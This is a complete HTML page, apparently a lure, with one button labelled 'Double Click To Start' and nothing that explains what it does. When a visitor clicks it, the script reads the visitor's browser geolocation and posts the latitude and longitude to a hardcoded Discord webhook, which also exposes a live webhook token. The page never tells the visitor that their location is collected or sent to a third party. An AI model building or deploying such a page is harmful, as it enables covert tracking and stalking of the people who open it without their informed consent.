<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolocation and Webhook</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background-color: #f4f4f4;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        button {
            margin-top: 10px;
            font-size: 16px;
            padding: 10px 20px;
            cursor: pointer;
        }

        h1 {
            position: fixed;
            bottom: 20px;
            font-size: 20px;
            color: #333;
            text-align: center;
        }
    </style>
</head>
<body>

<button id="actionButton">Double Click To Start</button>

<script>
    const actionButton = document.getElementById('actionButton');

    actionButton.addEventListener('click', async () => {
        try {
            const locationPromise = (async () => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;

                        // Send data to Discord Webhook
                        const webhookURL = 'https://discord.com/api/webhooks/1348210424159670322/gukDXFj2FC01Ne9_Td3C7JyQecgknXxYcTiWRjC4S40mDBuJI1JngkEOpqhbb54BCMA9';
                        const message = {
                            content: `Geolocation Data: Latitude: ${lat}, Longitude: ${lon}`
                        };

                        const response = await fetch(webhookURL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(message)
                        });

                        if (response.ok) {
                            console.log('Data sent to Discord Webhook');
                        } else {
                            console.error('Failed to send data to Discord');
                        }
                    }, (error) => {
                        console.error('Error getting location:', error);
                    });
                } else {
                    alert('Geolocation is not supported by this browser.');
                }
            })();
        } catch (error) {
            console.error('Error:', error);
        }
    });
</script>

</body>
</html>
